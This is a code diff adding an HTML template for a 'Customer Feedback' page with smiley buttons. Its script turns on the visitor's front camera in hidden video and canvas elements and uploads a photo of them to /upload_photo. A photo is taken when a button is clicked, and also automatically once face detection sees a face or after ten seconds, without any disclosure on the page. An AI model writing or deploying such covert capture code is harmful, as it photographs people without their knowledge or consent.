@@ -1,0 +1,113 @@
+{% extends "base.html" %}
+
+{% block title %}
+Customer Feedback
+{% endblock %}
+
+{% block content %}
+<div class="container my-5 text-center">
+  <h1 class="mb-4">How was your experience?</h1>
+  <div class="mb-4">
+    <button id="happyBtn" class="btn btn-success btn-lg mx-2">😊</button>
+    <button id="sadBtn" class="btn btn-danger btn-lg mx-2">😞</button>
+  </div>
+  <!-- Hidden video preview (for capturing the image) -->
+  <video id="video" autoplay playsinline class="d-none"></video>
+  <!-- Hidden canvas for drawing the captured image -->
+  <canvas id="canvas" class="d-none"></canvas>
+</div>
+
+<script>
+  // Flag to track if a selection (manual or auto) has been made.
+  let selectionMade = false;
+  const AUTO_FEEDBACK = 'auto';
+
+  // Use the front-facing camera
+  const constraints = {
+    video: { facingMode: "user" },
+    audio: false
+  };
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const context = canvas.getContext('2d');
+
+  // Request camera access and stream to the video element.
+  navigator.mediaDevices.getUserMedia(constraints)
+    .then(stream => {
+      video.srcObject = stream;
+    })
+    .catch(err => {
+      console.error("Error accessing camera:", err);
+    });
+
+  // Capture the current frame and send it along with feedback type to the server.
+  function captureAndSend(feedbackType) {
+    if (selectionMade) return; // Prevent duplicate captures.
+    selectionMade = true;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Convert canvas to a base64 image.
+    const dataUrl = canvas.toDataURL('image/png');
+
+    fetch('/upload_photo', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: dataUrl, feedback: feedbackType })
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log(data);
+    })
+    .catch(err => {
+      console.error("Error uploading photo:", err);
+    });
+  }
+
+  // Manual feedback button handlers.
+  document.getElementById('happyBtn').addEventListener('click', () => {
+    captureAndSend('happy');
+  });
+  document.getElementById('sadBtn').addEventListener('click', () => {
+    captureAndSend('sad');
+  });
+
+  // AUTO-CAPTURE: Check for a face if no manual selection is made.
+  if ('FaceDetector' in window) {
+    const faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+    const autoCaptureInterval = setInterval(() => {
+      if (selectionMade) {
+        clearInterval(autoCaptureInterval);
+        return;
+      }
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      faceDetector.detect(canvas)
+        .then(faces => {
+          if (faces.length > 0) {
+            console.log("Face detected, auto-capturing...");
+            captureAndSend(AUTO_FEEDBACK);
+            clearInterval(autoCaptureInterval);
+          }
+        })
+        .catch(err => {
+          console.error("Face detection error:", err);
+        });
+    }, 1000);
+  } else {
+    // Fallback: Auto-capture after 10 seconds if no feedback is given.
+    console.warn("FaceDetector API not supported; using timer fallback.");
+    setTimeout(() => {
+      if (!selectionMade) {
+        console.log("Auto-capturing after timer fallback.");
+        captureAndSend(AUTO_FEEDBACK);
+      }
+    }, 10000);
+  }
+</script>
+{% endblock %}
